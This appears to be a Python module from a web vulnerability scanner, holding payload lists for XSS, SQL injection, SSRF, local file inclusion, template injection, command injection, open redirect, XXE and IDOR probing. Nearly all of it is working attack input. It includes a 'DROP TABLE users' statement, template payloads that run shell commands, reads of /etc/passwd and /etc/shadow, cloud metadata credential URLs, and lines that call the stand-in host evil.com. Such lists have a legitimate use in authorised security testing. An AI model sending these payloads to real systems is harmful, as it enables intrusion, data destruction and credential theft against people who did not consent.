"""
base_payloads.py — Universal Cross-Context Payload Library
===========================================================
Core payload packs for all major vulnerability classes.
Used when the target stack fingerprint is unknown.
"""

from __future__ import annotations

# ─────────────────────────────────────────────
# XSS — Cross-Site Scripting
# ─────────────────────────────────────────────
XSS_PAYLOADS: list[str] = [
    # Basic inline script
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    # Attribute break-out
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '" autofocus onfocus="alert(1)"',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    # HTML5 media events
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    # Protocol handlers
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    # Context escapes
    "</title><script>alert(1)</script>",
    "</style><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "</noscript><script>alert(1)</script>",
    # Eval / obfuscated
    "eval('ale'+'rt(1)')",
    "alert`1`",
    "setTimeout(alert,0,1)",
    "eval(atob('YWxlcnQoMSk='))",
    "(new Function('alert(1)'))()",
    "[]['constructor']['constructor']('alert(1)')()",
    # Iframe / embed / object
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "<iframe src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    # SVG / math namespace
    "<math><mi xlink:href=javascript:alert(1)>CLICK</mi></math>",
    "<svg><script>alert&#40;1&#41;</script>",
    # AngularJS template
    "{{constructor.constructor('alert(1)')()}}",
    "{{$on.constructor('alert(1)')()}}",
    # DOM XSS probes
    '"-alert(1)-"',
    "'-alert(1)-'",
    '<!--<script>alert(1)//-->',
]

# ─────────────────────────────────────────────
# SQLi — SQL Injection (generic)
# ─────────────────────────────────────────────
SQLI_PAYLOADS: list[str] = [
    # Auth bypass
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "') OR ('1'='1",
    '1 OR 1=1',
    '" OR "1"="1',
    # UNION-based
    "' UNION SELECT 1--",
    "' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT user(),version(),database()--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    # Error-based
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(NULL,concat(0x7e,version()),NULL)--",
    "' AND 1=CONVERT(int,@@version)--",
    # Stacked
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','password')--",
    # Generic probes
    "'",
    '"',
    "--",
    "#",
    "/*",
    "' AND 1=1--",
    "' AND 1=2--",
]

SQLI_BLIND_TIME: list[str] = [
    # MySQL
    "' AND SLEEP(5)--",
    "1 AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)#",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    # PostgreSQL
    "'; SELECT pg_sleep(5)--",
    "1; SELECT pg_sleep(5)--",
    # Oracle
    "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(115),5) IS NOT NULL--",
    # Baselines (fast)
    "' AND SLEEP(0)--",
    "1 AND SLEEP(0)--",
]

SQLI_BOOLEAN: list[str] = [
    "' AND 1=1--",
    "' OR 1=1--",
    "1 AND 1=1",
    "' AND 'a'='a",
    "' AND 1=2--",
    "' OR 1=2--",
    "1 AND 1=2",
    "' AND 'a'='b",
]

# ─────────────────────────────────────────────
# SSRF — Server-Side Request Forgery
# ─────────────────────────────────────────────
SSRF_PAYLOADS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
    "http://2130706433/",      # 127.0.0.1 decimal
    "http://0177.0.0.1/",     # octal
    "http://0x7f000001/",     # hex
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
    "dict://127.0.0.1:11211/stats",
    "gopher://127.0.0.1:6379/_PING",
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1?.evil.com/",
    "http://127.0.0.1#.evil.com/",
]

# ─────────────────────────────────────────────
# LFI — Local File Inclusion
# ─────────────────────────────────────────────
LFI_PAYLOADS: list[str] = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../etc/passwd%00",
    "%2e%2e%2fetc%2fpasswd",
    "..%2fetc%2fpasswd",
    "%252e%252e%252fetc%252fpasswd",
    "..\\..\\windows\\win.ini",
    "C:\\Windows\\win.ini",
    "php://filter/read=convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "/var/log/nginx/access.log",
]

# ─────────────────────────────────────────────
# SSTI — Server-Side Template Injection
# ─────────────────────────────────────────────
SSTI_PAYLOADS: list[str] = [
    # Detection polyglot
    "{{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}",
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "*{7*7}",
    "<%=7*7%>",
    "@(1+1)",
    "{{7*'7'}}",
    # Jinja2
    "{{config.items()}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{lipsum.__globals__['os'].popen('id').read()}}",
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",
    # Twig
    "{{_self.env.displayVar('id')}}",
    "{{['id']|filter('system')}}",
    # Mako
    "<%import os%>${os.system('id')}",
    # Freemarker
    "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
    # EL / Spring
    "${applicationScope}",
    "${Runtime.getRuntime().exec('id')}",
    # ERB
    "<%= 7 * 7 %>",
    "<%= `id` %>",
    # Django leaks
    "{{settings.SECRET_KEY}}",
    "{{settings.DATABASES}}",
]

# ─────────────────────────────────────────────
# CMDI — Command Injection
# ─────────────────────────────────────────────
CMDI_PAYLOADS: list[str] = [
    "; id",
    "| id",
    "|| id",
    "&& id",
    "& id",
    "\n id",
    "`id`",
    "$(id)",
    "${IFS}id",
    "& whoami",
    "| whoami",
    "%0aid",
    "%0did",
    "%3bid",
    "%7cid",
    "%26id",
    "'`id`'",
    "\";id;\"",
    "$(cat /etc/passwd)",
    "| ping -c 1 evil.com",
]

CMDI_BLIND: list[str] = [
    "|| sleep 5 ||",
    "; sleep 5;",
    "| sleep 5",
    "&& sleep 5",
    "`sleep 5`",
    "$(sleep 5)",
    "${IFS}sleep${IFS}5",
    "& ping -n 5 127.0.0.1 &",
    "; ping -c 5 127.0.0.1",
    "%0asleep%205",
]

# ─────────────────────────────────────────────
# Open Redirect
# ─────────────────────────────────────────────
OPEN_REDIRECT_PAYLOADS: list[str] = [
    "//evil.com",
    "//evil.com/",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "/%09/evil.com",
    "/%2f%2fevil.com",
    "//google.com@evil.com",
    "///evil.com",
    "https://evil.com\\@legitimate.com",
    "//attacker%2ecom",
    "//attacker%252ecom",
    "\\/evil.com",
    "javascript:evil.com",
]

# ─────────────────────────────────────────────
# XXE — XML External Entity
# ─────────────────────────────────────────────
XXE_PAYLOADS: list[str] = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]><foo>test</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin/">]><foo>&xxe;</foo>',
    '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>',
]

# ─────────────────────────────────────────────
# IDOR — Insecure Direct Object Reference
# ─────────────────────────────────────────────
IDOR_PATHS: list[str] = [
    "/api/user/1",
    "/api/user/2",
    "/api/user/3",
    "/api/users/1/profile",
    "/api/users/2/profile",
    "/api/orders/1",
    "/api/orders/2",
    "/api/account/1",
    "/api/account/2",
    "/api/admin/users",
    "/api/admin/config",
    "/users/1",
    "/users/2",
    "/profile/1",
    "/profile/2",
    "/invoice/1",
    "/invoice/2",
    "/download?file=../../../etc/passwd",
    "/file?name=../../../etc/passwd",
    "/report?id=1",
    "/report?id=2",
]
